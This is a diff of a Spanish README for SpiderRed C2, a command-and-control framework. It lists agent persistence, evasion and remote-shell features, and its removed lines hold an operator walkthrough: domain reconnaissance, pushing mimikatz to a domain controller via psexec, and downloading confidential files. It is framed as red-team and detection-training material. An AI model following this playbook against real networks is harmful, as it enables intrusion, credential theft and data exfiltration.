@@ -1,263 +1,197 @@
-# 🕷️ SpiderRed C2 - Command & Control Framework
+```markdown
+# 🕷️ SpiderRed C2  
+**Experimental Command & Control Platform for Security Research**
 
-> **IMPORTANTE LEGAL**: SpiderRed es una herramienta para **pruebas de penetración autorizadas**, **investigación de seguridad**, y **ejercicios de red team**. Su uso fuera de entornos autorizados es **ilegal** y puede resultar en acciones penales.
+> ⚠️ **AVISO LEGAL**  
+> SpiderRed C2 es un proyecto **exclusivamente educativo y de investigación** destinado a **laboratorios controlados**, **pruebas de detección**, **purple team** y **análisis defensivo**.  
+> El uso de este software fuera de entornos **explícitamente autorizados** es ilegal.
 
-## 📋 Descripción Técnica
+---
 
-SpiderRed es un framework C2 ligero escrito en C++ diseñado para:
-- **Pruebas de penetración autorizadas** (red team)
-- **Simulación de adversarios** (adversary simulation)
-- **Investigación de malware** (en entornos controlados)
-- **Entrenamiento de blue team** (detection engineering)
+## 📌 Descripción General
 
-### Características Clave
+**SpiderRed C2** es una plataforma experimental de **Command & Control (C2)** escrita en **C++**, compuesta por:
 
-✅ **Ligero y rápido** (C++ nativo, sin dependencias pesadas)  
-✅ **Baja detección** (técnicas anti-EDR básicas)  
-✅ **Comunicación encriptada** (AES-256 + RSA para handshake)  
-✅ **Multi-plataforma** (Windows/Linux)  
-✅ **Modular** (fácil extensión)  
+- Un **agente avanzado para Windows**
+- Un **servidor C2 interactivo para Linux**
 
-## 🚀 Requisitos del Sistema
+El proyecto está diseñado para **simular comportamientos reales de malware moderno** con el objetivo de:
+- estudiar **detección por EDR**
+- analizar **TTPs MITRE ATT&CK**
+- entrenar **blue / purple teams**
+- experimentar con **arquitecturas C2**
 
-### Servidor C2 (Linux)
-```bash
-# Distribuciones compatibles
-- Kali Linux 2023.x+
-- Ubuntu 22.04+
-- Debian 11+
+No pretende competir con frameworks profesionales como **Cobalt Strike**, **Sliver** o **Mythic**, sino servir como **base de estudio y evolución controlada**.
 
-# Dependencias
-sudo apt-get update
-sudo apt-get install -y \
-    build-essential \
-    cmake \
-    libssl-dev \
-    gcc-11 \
-    g++-11
+---
+
+## 🧠 Arquitectura
+
 ```
+
+┌──────────────┐        Encrypted Beacon        ┌──────────────┐
+│  Windows     │  ───────────────────────────▶ │   Linux C2   │
+│  Agent       │   Custom TCP / Beaconing      │   Server     │
+│              │ ◀───────────────────────────  │              │
+└──────────────┘        Tasking / Commands      └──────────────┘
+
+```
+
+### Componentes
+- **Agent (Windows)**: ejecución remota, persistencia, evasión básica
+- **Server (Linux)**: gestión de agentes, cola de tareas y CLI interactiva
+
+---
+
+## ⚙️ Características Implementadas (Reales)
+
+### 🔹 Agente Windows
+- Comunicación periódica tipo **beacon con jitter**
+- **Cifrado simétrico AES-256 (CryptoAPI)**
+  - Clave estática (limitación conocida)
+- Identificación única mediante **MachineGuid**
+- Ejecución remota de comandos:
+  - `cmd.exe`
+  - PowerShell (no interactivo)
+- Transferencia básica de archivos
+- **Persistencia múltiple**:
+  - Registry Run / RunOnce
+  - Startup Folder
+  - Scheduled Task
+  - Servicio (requiere privilegios elevados)
+- **Evasión básica**:
+  - Anti-debug (IsDebuggerPresent, PEB checks)
+  - Anti-sandbox (uptime, RAM, CPU)
+  - Detección de VM (BIOS / manufacturer strings)
+  - Sleep evasivo (busy loop)
+- Control de instancia única mediante **mutex global**
+
+---
+
+### 🔹 Servidor C2 (Linux)
+- Servidor TCP multi-agente
+- Registro y seguimiento de agentes activos
+- Heartbeats y detección de agentes inactivos
+- **CLI interactiva**
+- Cola de tareas por agente
+- Historial de comandos ejecutados
+- Subida y descarga de archivos
+- Interacción directa por agente
+
+---
+
+## 🖥️ Comandos del Servidor
+
+```
+
+agents                 Listar agentes conectados
+info <id>              Información del agente
+interact <id>          Modo interactivo
+exec <id> <cmd>        Ejecutar comando
+shell <id>             Shell remota básica
+broadcast <cmd>        Ejecutar comando en todos
+upload <id> <l> <r>    Subir archivo
+download <id> <f>      Descargar archivo
+persist <id>           Activar persistencia
+tasks <id>             Historial de tareas
+kill <id>              Terminar agente
+clear                  Limpiar pantalla
+exit / quit            Cerrar servidor
+
+````
+
+---
+
+## 🔐 Criptografía y Seguridad
+
+- **AES-256 (CryptoAPI)** para cifrado de datos
+- Codificación Base64 para transporte
+- ⚠️ **Limitaciones conocidas**:
+  - No hay TLS real
+  - No existe handshake asimétrico
+  - Clave simétrica estática
+  - Sin autenticación fuerte del servidor
+
+> Estas limitaciones son **intencionadas** para facilitar el análisis defensivo y forense.
+
+---
+
+## 🧪 Casos de Uso Educativos
+
+- 🟣 Ejercicios de **Purple Team**
+- 🔵 Desarrollo de detecciones EDR / SIEM
+- 🧠 Análisis de tráfico C2
+- 🛡️ Threat Hunting
+- 📚 Estudio de arquitectura C2
+- 🎓 Proyectos académicos de ciberseguridad
+
+---
+
+## 🧭 Mapeo MITRE ATT&CK (Parcial)
+
+| Técnica | ID |
+|------|----|
+| Command Execution | T1059 |
+| PowerShell | T1059.001 |
+| Persistence | T1547 |
+| Scheduled Task | T1053 |
+| Service Creation | T1543 |
+| Defense Evasion | T1027 |
+| Sandbox Evasion | T1497 |
+| C2 Beaconing | T1071 |
+
+---
+
+## 🚧 Limitaciones Conocidas
+
+- ❌ Sin TLS real
+- ❌ Sin RSA / ECDH handshake
+- ❌ Sin módulos dinámicos
+- ❌ Sin inyección de procesos
+- ❌ Sin movimiento lateral
+- ❌ Protocolo C2 simple y no estandarizado
+
+---
+
+## 🛠️ Compilación
+
+### Servidor (Linux)
+```bash
+g++ -std=c++17 -pthread server.cpp -o c2_server
+````
 
 ### Agente (Windows)
-- Windows 10/11 64-bit
-- Visual Studio 2019/2022 (para compilación)
-- Windows SDK 10.0.19041.0+
 
-## 📦 Instalación Rápida
-
-### 1. Clonar el Repositorio
-```bash
-git clone https://github.com/JdExploit/SpiderRed-C2.git
-cd SpiderRed-C2
+```bat
+cl /EHsc /O2 /MT agent.cpp ^
+  ws2_32.lib wininet.lib crypt32.lib bcrypt.lib advapi32.lib ^
+  /SUBSYSTEM:WINDOWS
 ```
 
-### 2. Compilar el Servidor (Linux)
-```bash
-# Dar permisos de ejecución
-chmod +x compile_server.sh
+---
 
-# Compilar
-./compile_server.sh
+## 📈 Roadmap (Opcional)
 
-# Verificar compilación
-ls -la c2_server
+* Handshake asimétrico real
+* TLS con certificados
+* Protocolo estructurado (JSON / Protobuf)
+* Modularización de payloads
+* Telemetría defensiva
+* Exportación de eventos para SIEM
+
+---
+
+## 🧠 Filosofía del Proyecto
+
+> *“Para detectar un C2, primero hay que entender cómo funciona.”*
+
+SpiderRed C2 **no busca ser indetectable**, sino **comprensible, auditable y mejorable**.
+
+---
+
+## 📜 Licencia
+
+Uso exclusivo para **educación, investigación y entornos autorizados**.
+
 ```
-
-### 3. Compilar el Agente (Windows)
-**Usando Visual Studio Developer Command Prompt:**
-```cmd
-# Navegar al directorio
-cd C:\path\to\SpiderRed-C2
-
-# Compilar Release x64
-cl /EHsc /std:c++17 /O2 /MT /DNDEBUG ^
-    /I"C:\Program Files\OpenSSL-Win64\include" ^
-    agent.cpp ^
-    /link /LIBPATH:"C:\Program Files\OpenSSL-Win64\lib" libssl.lib libcrypto.lib ^
-    ws2_32.lib advapi32.lib user32.lib ^
-    /OUT:agent.exe /SUBSYSTEM:CONSOLE
 ```
-
-**O usar el batch incluido (requiere VS instalado):**
-```cmd
-compile_agent.bat
-```
-
-## 🖥️ Configuración del Servidor
-
-### 1. Configurar IP y Puerto
-Editar `server.cpp` (línea ~50):
-```cpp
-#define SERVER_IP "0.0.0.0"    // Escuchar en todas las interfaces
-#define SERVER_PORT 443         // Usar puerto común para evadir filtros básicos
-```
-
-### 2. Compilar con encriptación
-```bash
-# Habilitar OpenSSL para encriptación
-sudo apt-get install libssl-dev
-g++ -std=c++17 -pthread -o c2_server server.cpp -lcrypto
-```
-
-### 3. Ejecutar el Servidor
-```bash
-# Ejecutar normalmente
-./c2_server
-
-# Ejecutar en segundo plano
-nohup ./c2_server > c2.log 2>&1 &
-
-# Ver logs
-tail -f c2.log
-```
-
-## 🎯 Despliegue del Agente
-
-### Métodos de Ejecución
-
-**1. Ejecución Directa:**
-```cmd
-agent.exe
-```
-
-**2. Ejecución con Persistencia (Registry Run):**
-```cmd
-agent.exe --install
-# Se instala en: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-```
-
-**3. Ejecución como Servicio:**
-```cmd
-# Requiere permisos de administrador
-agent.exe --service-install
-sc start SpiderRedAgent
-```
-
-**4. Ejecución con Inyección de Proceso:**
-```powershell
-# Inyectar en un proceso legítimo
-.\agent.exe --inject notepad.exe
-```
-
-### Técnicas de Evasión Básicas
-
-El agente incluye:
-- **Anti-sandbox**: Detecta máquinas virtuales comunes
-- **Anti-debug**: Chequea debuggers adjuntos
-- **Uso mínimo de API**: Minimiza hooks de EDR
-- **Sleep obfuscation**: Ofuscación de tiempos de espera
-
-## 📡 Comandos del C2
-
-### Interfaz Principal
-```
-SpiderRed> help
-
-[+] Comandos Disponibles:
-
-AGENTES
-  agents                    - Listar agentes conectados
-  info <id>                 - Información detallada del agente
-  interact <id>             - Modo interactivo con agente
-  rename <id> <nombre>      - Renombrar agente
-  kill <id>                 - Terminar sesión del agente
-
-EJECUCIÓN
-  exec <id> <comando>       - Ejecutar comando
-  shell <id>                - Shell interactiva
-  powershell <id> <cmd>     - Ejecutar PowerShell
-  python <id> <script>      - Ejecutar script Python
-
-ARCHIVOS
-  upload <id> <loc> <rem>   - Subir archivo
-  download <id> <remoto>    - Descargar archivo
-  ls <id> <ruta>            - Listar directorio
-  cat <id> <archivo>        - Ver contenido
-  find <id> <patrón>        - Buscar archivos
-
-RECONOCIMIENTO
-  sysinfo <id>              - Información del sistema
-  netstat <id>              - Conexiones de red
-  processes <id>            - Listar procesos
-  screenshot <id>           - Capturar pantalla
-
-PRIVILEGIOS
-  getprivs <id>             - Obtener privilegios actuales
-  bypassuac <id>            - Intentar bypass de UAC
-  steal_token <id> <pid>    - Robar token de proceso
-
-PERSISTENCIA
-  persist <id>              - Establecer persistencia
-  schedule <id> <tarea>     - Crear tarea programada
-  registry <id> <ruta>      - Agregar entrada de registro
-
-LATERAL MOVEMENT
-  psexec <id> <host> <cmd>  - Ejecutar comando remoto via PsExec
-  wmi <id> <host> <cmd>     - Ejecutar via WMI
-  smb <id> <share>          - Enumerar recursos SMB
-
-SALIR
-  exit                      - Salir del servidor C2
-  quit                      - Salir del servidor C2
-```
-
-## 🔧 Ejemplos de Uso en Pentesting
-
-### 1. Fase Inicial - Reconocimiento
-```bash
-SpiderRed> agents
-[0] WIN10-CLIENT (192.168.1.105) - Domain\User - Windows 10 Pro
-
-SpiderRed> interact 0
-SpiderRed[WIN10-CLIENT]> sysinfo
-SpiderRed[WIN10-CLIENT]> netstat
-SpiderRed[WIN10-CLIENT]> whoami /priv
-```
-
-### 2. Enumeración de Red
-```bash
-SpiderRed[WIN10-CLIENT]> exec arp -a
-SpiderRed[WIN10-CLIENT]> exec net view /domain
-SpiderRed[WIN10-CLIENT]> exec net group "Domain Admins" /domain
-```
-
-### 3. Movimiento Lateral
-```bash
-SpiderRed[WIN10-CLIENT]> exec net use \\DC01\C$ /user:domain\user
-SpiderRed[WIN10-CLIENT]> upload 0 mimikatz.exe \\DC01\C$\Windows\Temp\
-SpiderRed[WIN10-CLIENT]> psexec 0 DC01 "C:\Windows\Temp\mimikatz.exe"
-```
-
-### 4. Exfiltración de Datos
-```bash
-SpiderRed[WIN10-CLIENT]> find 0 *.pdf
-SpiderRed[WIN10-CLIENT]> download 0 C:\Users\Admin\Documents\confidential.pdf
-```
-
-## 🛡️ Hardening y Seguridad
-
-### 1. Autenticación del Servidor
-```cpp
-// En server.cpp - Configurar credenciales
-#define C2_USERNAME "redteam"
-#define C2_PASSWORD "SecurePass123!"
-#define C2_ENCRYPTION_KEY "32-Byte-AES-Key-For-Encryption!!"
-```
-
-### 2. Usar Certificados SSL
-```bash
-# Generar certificado autofirmado
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-
-# Compilar con soporte SSL
-g++ -std=c++17 -pthread -o c2_server server.cpp -lcrypto -lssl
-```
-
-### 3. Configurar Firewall
-```bash
-# Permitir solo IPs específicas
-sudo iptables -A INPUT -p tcp --dport 443 -s 192.168.1.0/24 -j ACCEPT
-sudo iptables -A INPUT -p tcp --dport 443 -j DROP
-```
-
-
-> ⚠️ **ADVERTENCIA LEGAL**: Este software es únicamente para fines educativos y de investigación autorizada. El uso no autorizado es ilegal y puede resultar en severas consecuencias penales.
